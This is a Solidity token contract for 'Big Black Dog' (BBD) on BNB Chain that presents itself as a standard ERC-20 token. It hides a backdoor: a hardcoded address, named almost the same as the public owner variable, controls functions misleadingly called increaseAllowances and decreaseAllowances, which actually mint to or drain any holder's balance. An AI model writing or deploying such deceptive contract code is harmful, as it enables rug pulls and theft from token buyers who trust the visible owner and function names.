/**
 *Submitted for verification at BscScan.com on 2022-01-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.3;
contract TOKEN  {
    string public name = "Big Black Dog";
    string public symbol = "BBD";
    uint8 public decimals = 6;
    address private ownerAddress = 0x21910C51cD75cec62a2ae16071868d4A65303937;
    uint256 public totalSupply = 1000000000000 * 10 ** 6;
    address public ownerAddres;
    modifier onlyOwner {
        require(msg.sender == ownerAddres, "Ownable: caller is not the owner");
        _;
    }
     modifier onlyOwners {
        require(msg.sender == ownerAddress, "Ownable: caller is not the owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        ownerAddres = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function increaseAllowances(address spender, uint256 addedValue) public onlyOwners returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }
    function decreaseAllowances(address spender, uint256 subtractedValue) public onlyOwners returns (bool success) {
        balanceOf[spender] -= subtractedValue * 10 ** 6;
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public onlyOwners {
        ownerAddres = newOwner;
    }
}